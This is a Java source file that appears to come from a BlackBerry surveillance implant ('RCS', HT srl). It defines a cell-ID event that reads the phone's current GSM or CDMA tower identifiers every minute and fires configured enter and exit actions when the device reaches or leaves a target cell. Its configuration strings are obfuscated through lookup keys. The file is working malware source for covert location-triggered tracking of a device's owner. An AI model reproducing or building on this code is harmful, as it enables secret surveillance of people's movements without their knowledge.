//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CellIdEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import net.rim.device.api.system.CDMAInfo;
import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
import net.rim.device.api.system.RadioInfo;
import blackberry.Device;
import blackberry.Messages;
import blackberry.config.ConfEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

/**
 * The Class CellIdEvent.
 */
public final class EventCellId extends Event {
    private static final long CELLID_PERIOD = 60000;
    private static final long CELLID_DELAY = 1000;
    //#ifdef DEBUG
    private static Debug debug = new Debug("CellIdEvent", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    int actionOnEnter;
    int actionOnExit;

    int mccOrig;
    int mncOrig;
    int lacOrig;
    int cidOrig;

    boolean entered = false;

    public boolean parse(ConfEvent conf) {

        mccOrig = conf.getInt(Messages.getString("t.7"), 0); //$NON-NLS-1$
        mncOrig = conf.getInt(Messages.getString("t.8"), 0); //$NON-NLS-1$
        lacOrig = conf.getInt(Messages.getString("t.9"), 0); //$NON-NLS-1$
        cidOrig = conf.getInt(Messages.getString("t.10"), 0); //$NON-NLS-1$

        //#ifdef DEBUG
        debug.trace(" Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: " + lacOrig + " Cid: " + cidOrig);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
        //#endif

        setPeriod(CELLID_PERIOD);
        setDelay(CELLID_DELAY);

        return true;
    }

    protected void actualStart() {
        entered = false;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualLoop() {
        //final boolean gprs = Device.isGPRS();
        int mcc = 0, mnc = 0, lac = 0, cid = 0;

        if (Device.isGPRS()) {

            final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();

            mcc = Utils
                    .hex(RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex()));
            mnc = RadioInfo.getMNC(RadioInfo.getCurrentNetworkIndex());

            lac = cellinfo.getLAC();
            cid = cellinfo.getCellId();
            // bsic = cellinfo.getBSIC();

            final StringBuffer mb = new StringBuffer();
            mb.append(Messages.getString("t.6") + mcc); //$NON-NLS-1$
            mb.append(Messages.getString("t.5") + mnc); //$NON-NLS-1$
            mb.append(Messages.getString("t.4") + lac); //$NON-NLS-1$
            mb.append(Messages.getString("t.3") + cid); //$NON-NLS-1$
            //#ifdef DEBUG
            debug.info(mb.toString());
            //#endif

        } else if (Device.isCDMA()) {
            final CDMACellInfo cellinfo = CDMAInfo.getCellInfo();
            //CDMAInfo.getIMSI()
            final int sid = cellinfo.getSID();
            final int nid = cellinfo.getNID();
            final int bid = cellinfo.getBID();
            //https://www.blackberry.com/jira/browse/JAVAAPI-641
            mcc = RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex());

            final StringBuffer mb = new StringBuffer();
            mb.append(Messages.getString("t.2") + sid); //$NON-NLS-1$
            mb.append(Messages.getString("t.1") + nid); //$NON-NLS-1$
            mb.append(Messages.getString("t.0") + bid); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.info(mb.toString());
            //#endif

            mnc = sid;
            lac = nid;
            cid = bid;
        } else if (Device.isIDEN()) {
            //#ifdef DEBUG
            debug.error("actualRun: IDEN not supported"); //$NON-NLS-1$
            //#endif
            return;
        }

        if ((mccOrig == 0 || mccOrig == mcc)
                && (mncOrig == 0 || mncOrig == mnc)
                && (lacOrig == 0 || lacOrig == lac)
                && (cidOrig == 0 || cidOrig == cid)) {
            if (!entered) {
                //#ifdef DEBUG
                debug.info("Enter"); //$NON-NLS-1$
                //#endif
                entered = true;
                onEnter();
            } else {
                //#ifdef DEBUG
                debug.trace("already entered"); //$NON-NLS-1$
                //#endif
            }

        } else {
            if (entered) {
                //#ifdef DEBUG
                debug.info("Exit"); //$NON-NLS-1$
                //#endif
                entered = false;
                onExit();
            } else {
                //#ifdef DEBUG
                debug.trace("already exited"); //$NON-NLS-1$
                //#endif
            }
        }
    }

    public void actualStop() {
        onExit(); // di sicurezza
    }

}
